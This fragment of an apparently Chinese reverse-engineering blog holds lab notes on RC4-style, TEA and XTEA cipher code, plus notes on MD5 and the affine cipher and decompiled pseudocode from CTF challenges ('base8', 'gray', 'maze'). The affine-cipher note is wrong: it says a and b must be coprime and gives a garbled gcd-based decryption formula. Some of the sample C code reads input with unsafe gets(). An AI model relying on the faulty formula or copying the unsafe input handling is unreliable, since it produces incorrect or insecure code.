<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">panduanweishu</span><span class="params">(<span class="type">int</span> a)</span><span class="comment">//判断key数位数，方便填充T表</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> b,c;</span><br><span class="line">    <span class="keyword">for</span>(b=<span class="number">1</span>,c=<span class="number">10</span>;<span class="number">1</span>;b++,c*=<span class="number">10</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a/c==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">anweitianchongKbiao</span><span class="params">(<span class="type">int</span> *T,<span class="type">int</span> b,<span class="type">int</span> weishu)</span><span class="comment">//对T表进行填充</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a,c;</span><br><span class="line"><span class="keyword">for</span>(a=weishu<span class="number">-1</span>,c=<span class="number">10</span>;a&gt;=<span class="number">0</span>;a--,c*=<span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">    T[a]=b%c-b%(c/<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(a=weishu;a&lt;<span class="number">128</span>;a++)</span><br><span class="line">&#123;</span><br><span class="line">    T[a]=T[a%weishu];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> *a,<span class="type">int</span> x,<span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">   a[x]=a[x]^a[y];</span><br><span class="line">   a[y]=a[x]^a[y];</span><br><span class="line">   a[x]=a[x]^a[y];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> S[<span class="number">128</span>],T[<span class="number">128</span>],a,b,c,d,key;</span><br><span class="line">    <span class="type">char</span> jiami[<span class="number">100</span>],jiemi[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请选择加密或解密 0/1:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">switch</span>(a)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入待加密字符&quot;</span>);</span><br><span class="line">    gets(jiami);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入初始KEY&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;key);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">for</span>(a=<span class="number">0</span>;a&lt;<span class="number">128</span>;a++)</span><br><span class="line">    &#123;</span><br><span class="line">        S[a]=a;<span class="comment">//初始化S表</span></span><br><span class="line">    &#125;</span><br><span class="line">    anweitianchongKbiao(T,key,panduanweishu(key));</span><br><span class="line">    <span class="keyword">for</span>(a=<span class="number">0</span>,b=<span class="number">0</span>;a&lt;<span class="number">128</span>;a++)</span><br><span class="line">    &#123;</span><br><span class="line">        b=(b+S[a]+T[a])%<span class="number">128</span>;<span class="comment">//通过T表提供顺序进行打乱S表</span></span><br><span class="line">        swap(S,a,b);<span class="comment">//打乱操作</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//取得密钥,同时加密 </span></span><br><span class="line">    <span class="keyword">for</span>(a=<span class="number">0</span>,b=<span class="number">0</span>,c=<span class="number">0</span>;a&lt;<span class="built_in">strlen</span>(jiami);a++)<span class="comment">//此处都为取得密码流操作对字符进行异或</span></span><br><span class="line">    &#123;</span><br><span class="line">        b=(b+<span class="number">1</span>)%<span class="number">128</span>;</span><br><span class="line">        c=(c+S[b])%<span class="number">128</span>;</span><br><span class="line">        swap(S,b,c);</span><br><span class="line">        d=(S[b]+S[c])%<span class="number">128</span>;</span><br><span class="line">        key=S[d];</span><br><span class="line">        jiami[a]=jiami[a]^key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(jiami);</span><br><span class="line">    &#125;<span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;请输入待解密字符&quot;</span>);<span class="comment">//解密过程是通过相同的异或操作恢复原来的数据</span></span><br><span class="line">    gets(jiami);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入初始KEY&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;key);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">for</span>(a=<span class="number">0</span>;a&lt;<span class="number">128</span>;a++)</span><br><span class="line">    &#123;</span><br><span class="line">        S[a]=a;</span><br><span class="line">    &#125;</span><br><span class="line">    anweitianchongKbiao(T,key,panduanweishu(key));</span><br><span class="line">    <span class="keyword">for</span>(a=<span class="number">0</span>,b=<span class="number">0</span>;a&lt;<span class="number">128</span>;a++)</span><br><span class="line">    &#123;</span><br><span class="line">        b=(b+S[a]+T[a])%<span class="number">128</span>;<span class="comment">//通过T表提供顺序进行打乱S表</span></span><br><span class="line">        swap(S,a,b);<span class="comment">//打乱操作</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(a=<span class="number">0</span>,b=<span class="number">0</span>,c=<span class="number">0</span>;a&lt;<span class="built_in">strlen</span>(jiami);a++)</span><br><span class="line">    &#123;</span><br><span class="line">        b=(b+<span class="number">1</span>)%<span class="number">128</span>;</span><br><span class="line">        c=(c+S[b])%<span class="number">128</span>;</span><br><span class="line">        swap(S,b,c);</span><br><span class="line">        d=(S[b]+S[c])%<span class="number">128</span>;</span><br><span class="line">        key=S[d];</span><br><span class="line">        jiami[a]=(<span class="type">unsigned</span> <span class="type">char</span>)jiami[a]^key;<span class="comment">//通过异或相同的数来使其恢复</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(jiami);</span><br><span class="line">    &#125;<span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h4><p>此处用了&lt;stdint.h&gt;定义了int16_t,int32_t等带符号整形也有uint8_t，uint16_t等不带符号的整形，u为unsigned的意思</p>
<p>tea加密总体也是用异或加密实现的，且系列算法都通过一个常数作为倍数一般写作0X9E3779B9，</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">teajiami</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> <span class="comment">//此处uint32长度就为usigned int占32bit共4个字节</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0</span>;  <span class="comment">// 注意sum也是32位无符号整型</span></span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) <span class="comment">//进行32轮迭代，次数越多越难破解，但同时效率也会降低</span></span><br><span class="line">    &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>]=v0; </span><br><span class="line">    v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">teajiemi</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> <span class="comment">//解密也是进行相同的异或操作，通过异或同一个数恢复原数</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">uint32_t</span> sum = delta * <span class="number">32</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>]=v0; </span><br><span class="line">    v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// test</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 两个32位无符号整数，即待加密的64bit明文数据</span></span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">2</span>] = &#123;<span class="number">0x12345678</span>, <span class="number">0x78563412</span>&#125;;</span><br><span class="line">    <span class="comment">// 四个32位无符号整数，即128bit的key</span></span><br><span class="line">    <span class="type">uint32_t</span> k[<span class="number">4</span>]= &#123;<span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x4</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Data is : %x %x\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line">    teajiami(v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Encrypted data is : %x %x\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line">    teajiemi(v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Decrypted data is : %x %x\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="XTEA"><a href="#XTEA" class="headerlink" title="XTEA"></a>XTEA</h4><p>待做（），跟tea加密类似，都有相同的（&amp;,^,&lt;&lt;,&gt;&gt;）位运算，只不过每次的key是有变化的，但通过观察伪代码应该可以实现辨认</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="XXTEA"><a href="#XXTEA" class="headerlink" title="XXTEA"></a>XXTEA</h4><p>待做（)，跟tea加密类似，加密轮数由待加密字符数决定</p>
<h4 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h4><p>md5主要用于校验文件（不同的文件生成的md5码不同，通过检测传输前后的md5码可以检测其是否被篡改）</p>
<p>MD5可以将信息以512位来处理信息</p>
<p>主要是让信息长度比512的整数倍少64位（记录数据长度），若不足则进行填充（由一个一和对应的后续一段0表示）</p>
<p>再将对应的信息分块，每块有512位，再将每块再分为16个32位</p>
<p>用四组幻数进行循环计算（可用于检验是否位为MD5算法）</p>
<p>另外检验MD5算法一般可以看见较长的函数运算语句</p>
<h4 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h4><p>和数学上的线性方程类似</p>
<p>可通过a,b(这俩个都为密钥),n(字符个数)</p>
<p>c(密文)&#x3D;(a*m(待加密字符)+b)(mod n)</p>
<p>此处n的个数就是字典的长度（字典可自定义）</p>
<p>因为要解密所以a与b需互质，这样才能让字符与密文一一对应</p>
<p>则解密算法为</p>
<p>d(解密)&#x3D;(a-gcd(a,n)(c-b))(mod 26)</p>
<p>gcd为欧几里得算法，取最大公约数</p>
]]></content>
      <categories>
        <category>Re</category>
        <category>实验室报告</category>
      </categories>
  </entry>
  <entry>
    <title>base8 mp</title>
    <url>/2023/03/03/Re/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8A%A5%E5%91%8A/base8%20mp/</url>
    <content><![CDATA[<p>base8</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230149136.png"
                      alt="image-20230303191609257"
                ></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_4117A0</span><span class="params">(<span class="type">char</span> *a1, _BYTE *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">16</span>]; <span class="comment">// [esp+DCh] [ebp-14h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41C014);</span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;01234567&quot;</span>);</span><br><span class="line">  *a2 = v3[*a1 &gt;&gt; <span class="number">5</span>];</span><br><span class="line">  a2[<span class="number">1</span>] = v3[(*a1 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">7</span>];</span><br><span class="line">  a2[<span class="number">2</span>] = v3[<span class="number">2</span> * (*a1 &amp; <span class="number">3</span>) + (a1[<span class="number">1</span>] &gt;&gt; <span class="number">7</span>)];</span><br><span class="line">  a2[<span class="number">3</span>] = v3[(a1[<span class="number">1</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">7</span>];</span><br><span class="line">  a2[<span class="number">4</span>] = v3[(a1[<span class="number">1</span>] &gt;&gt; <span class="number">1</span>) &amp; <span class="number">7</span>];</span><br><span class="line">  a2[<span class="number">5</span>] = v3[<span class="number">4</span> * (a1[<span class="number">1</span>] &amp; <span class="number">1</span>) + (a1[<span class="number">2</span>] &gt;&gt; <span class="number">6</span>)];</span><br><span class="line">  a2[<span class="number">6</span>] = v3[(a1[<span class="number">2</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">7</span>];</span><br><span class="line">  result = <span class="number">7</span>;</span><br><span class="line">  a2[<span class="number">7</span>] = v3[a1[<span class="number">2</span>] &amp; <span class="number">7</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>此处为base8形式可以用大数运算来进行</p>
<p>具体解密代码如下‘</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> zidian[]=<span class="string">&quot;01234567&quot;</span>;</span><br><span class="line"><span class="type">int</span> flag=<span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> jiemizifu[<span class="number">3</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">bianli</span><span class="params">(<span class="type">char</span> a)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> b=<span class="number">0</span>;b&lt;<span class="number">8</span>;b++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(a==zidian[b])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> b;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="title function_">zhuanhua10</span><span class="params">(<span class="type">char</span> *a,<span class="type">char</span> *b)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(b-a&gt;<span class="number">7</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> bianli(*a)+zhuanhua10(a<span class="number">-1</span>,b)*<span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="title function_">zhuanhua256</span><span class="params">(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> a)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a&lt;=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> a%<span class="number">256</span>+zhuanhua256((a-a%<span class="number">256</span>)/<span class="number">256</span>)*<span class="number">1000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">jiemi</span><span class="params">(<span class="type">char</span> *a,<span class="type">char</span> *b,<span class="type">int</span> lenth)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;j&lt;lenth;i+=<span class="number">3</span>,j+=<span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> linshi=zhuanhua256(zhuanhua10(a+j+<span class="number">7</span>,a+j+<span class="number">7</span>));</span><br><span class="line">    (b)[i+<span class="number">2</span>]=linshi%<span class="number">1000</span>;</span><br><span class="line">    linshi/=<span class="number">1000</span>;</span><br><span class="line">    (b)[i+<span class="number">1</span>]=(linshi%<span class="number">1000</span>);</span><br><span class="line">    linshi/=<span class="number">1000</span>;</span><br><span class="line">    (b)[i]=(linshi%<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> zifuchuan[]=<span class="string">&quot;2645153225431064252551072025110716055127160331032465113222654061142345302363050424443400&quot;</span>;</span><br><span class="line"><span class="type">char</span> a[<span class="number">100</span>];</span><br><span class="line">jiemi(zifuchuan,(a),<span class="number">89</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Re</category>
        <category>实验室报告</category>
      </categories>
  </entry>
  <entry>
    <title>gray</title>
    <url>/2023/03/04/Re/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8A%A5%E5%91%8A/gray/</url>
    <content><![CDATA[<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v2; <span class="comment">// [esp+D0h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+DCh] [ebp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [esp+F8h] [ebp+8h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41C014);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(<span class="number">0xA</span>u);</span><br><span class="line">  j_memset(v2, <span class="number">0</span>, <span class="number">0xA</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_BYTE *)v2 + v3) = (a1 % <span class="number">0xA</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">    v4 = a1 / <span class="number">0xA</span>;</span><br><span class="line">    *((_BYTE *)v2 + v3) |= <span class="number">16</span> * ((v4 % <span class="number">0xA</span>) &amp; <span class="number">0xF</span>);</span><br><span class="line">    a1 = v4 / <span class="number">0xA</span>;</span><br><span class="line">    ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_415F90</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+D0h] [ebp-A0h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+DCh] [ebp-94h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [esp+E8h] [ebp-88h]</span></span><br><span class="line">  <span class="type">int</span> n; <span class="comment">// [esp+E8h] [ebp-88h]</span></span><br><span class="line">  <span class="type">int</span> jj; <span class="comment">// [esp+E8h] [ebp-88h]</span></span><br><span class="line">  <span class="type">int</span> kk; <span class="comment">// [esp+E8h] [ebp-88h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+F4h] [ebp-7Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+F4h] [ebp-7Ch]</span></span><br><span class="line">  <span class="type">int</span> m; <span class="comment">// [esp+F4h] [ebp-7Ch]</span></span><br><span class="line">  <span class="type">int</span> ii; <span class="comment">// [esp+F4h] [ebp-7Ch]</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// [esp+103h] [ebp-6Dh]</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [esp+103h] [ebp-6Dh]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v14; <span class="comment">// [esp+10Fh] [ebp-61h]</span></span><br><span class="line">  <span class="type">char</span> v15; <span class="comment">// [esp+10Fh] [ebp-61h]</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [esp+10Fh] [ebp-61h]</span></span><br><span class="line">  <span class="type">char</span> v17[<span class="number">84</span>]; <span class="comment">// [esp+118h] [ebp-58h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41C014);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">9</span>; !*(_BYTE *)(i + a1); --i )</span><br><span class="line">    ;</span><br><span class="line">  v2 = i + <span class="number">1</span>;</span><br><span class="line">  j_memset(v17, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v2; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = *(_BYTE *)(j + a1) &amp; <span class="number">0xF</span>;</span><br><span class="line">    v3 = <span class="number">8</span> * j + <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">2</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( v14 )</span><br><span class="line">      &#123;</span><br><span class="line">        v17[v3--] = v14 &amp; <span class="number">1</span>;</span><br><span class="line">        v14 /= <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v14 = (<span class="type">int</span>)*(<span class="type">unsigned</span> __int8 *)(j + a1) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">      v3 = <span class="number">8</span> * j + <span class="number">7</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; <span class="number">2</span> * v2; ++m )</span><br><span class="line">  &#123;</span><br><span class="line">    v17[<span class="number">4</span> * m] = v17[<span class="number">4</span> * m];</span><br><span class="line">    v15 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt; <span class="number">4</span>; ++n )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = v17[<span class="number">4</span> * m + n];</span><br><span class="line">      v17[<span class="number">4</span> * m + n] = v15 ^ v12;</span><br><span class="line">      v15 = v12;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( ii = <span class="number">0</span>; ; ++ii )</span><br><span class="line">  &#123;</span><br><span class="line">    result = ii;</span><br><span class="line">    <span class="keyword">if</span> ( ii &gt;= v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v16 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( jj = <span class="number">0</span>; jj &lt; <span class="number">4</span>; ++jj )</span><br><span class="line">      v16 = v17[<span class="number">8</span> * ii + jj] + <span class="number">2</span> * v16;</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( kk = <span class="number">4</span>; kk &lt; <span class="number">8</span>; ++kk )</span><br><span class="line">      v13 = v17[<span class="number">8</span> * ii + kk] + <span class="number">2</span> * v13;</span><br><span class="line">    *(_BYTE *)(ii + a1) = v16 | (<span class="number">16</span> * v13);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Re</category>
        <category>实验室报告</category>
      </categories>
  </entry>
  <entry>
    <title>maze</title>
    <url>/2023/03/04/Re/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8A%A5%E5%91%8A/maze/</url>
    <content><![CDATA[<p>maze</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">int64 <span class="title function_">sub_5605D8C00940</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-218h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-214h]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">520</span>]; <span class="comment">// [rsp+10h] [rbp-210h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+218h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">  _isoc99_scanf(&amp;unk_5605D8C01278, v4, v4);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="number">0</span>;</span><br><span class="line">      sub_5605D8C0086C();</span><br><span class="line">      v0 = v4[v3];</span><br><span class="line">      <span class="keyword">if</span> ( v0 == <span class="number">100</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v2 = sub_5605D8C00E23();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v0 &gt; <span class="number">100</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v0 == <span class="number">115</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v2 = sub_5605D8C00C5A();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v0 == <span class="number">119</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v2 = sub_5605D8C00A92();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v0 == <span class="number">27</span> )</span><br><span class="line">    